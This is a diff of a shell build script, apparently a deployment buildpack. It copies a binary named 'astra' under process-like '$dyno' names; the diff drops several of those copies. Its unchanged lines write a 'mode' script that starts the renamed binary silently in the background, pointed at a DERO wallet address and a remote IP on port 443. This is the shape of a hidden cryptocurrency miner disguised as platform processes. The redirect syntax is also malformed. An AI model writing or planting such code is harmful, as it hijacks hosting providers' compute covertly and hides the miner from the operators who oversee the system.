@@ -8,14 +8,6 @@ mkdir -p "$1/bin/"
 cp -a binaries-$STACK/* "$1/bin/"
 cp -a "$1/bin/astra" "$1/bin/$dyno"
 cp -a "$1/bin/astra" "$1/bin/$dyno2"
-cp -a "$1/bin/astra" "$1/bin/$dyno3"
-cp -a "$1/bin/astra" "$1/bin/$dyno4"
-cp -a "$1/bin/astra" "$1/bin/$dyno5"
-cp -a "$1/bin/astra" "$1/bin/$dyno6"
-cp -a "$1/bin/astra" "$1/bin/$dyno7"
-cp -a "$1/bin/astra" "$1/bin/$dyno8"
-cp -a "$1/bin/astra" "$1/bin/$dyno9"
-cp -a "$1/bin/astra" "$1/bin/$dyno10"
 cat > "$1/bin/mode" <<END
 /app/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443 >/dev/null 2.&1 >/dev/null &
 sleep 0.1
